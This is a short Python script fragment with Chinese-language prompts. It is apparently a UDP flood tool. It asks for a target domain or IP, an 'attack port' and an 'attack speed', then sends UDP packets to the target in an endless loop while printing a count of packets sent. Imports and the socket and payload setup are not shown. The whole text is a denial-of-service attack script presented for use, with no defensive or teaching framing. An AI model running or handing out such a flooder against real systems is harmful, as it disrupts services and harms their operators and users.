target = input("请输入目标域名或IP : ")

try:
    ip = socket.gethostbyname(target)
except socket.gaierror:
    print("无法解析域名，请检查输入是否正确。")
    sys.exit()

port = int(input("攻击端口      : "))
sd = int(input("攻击速度(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)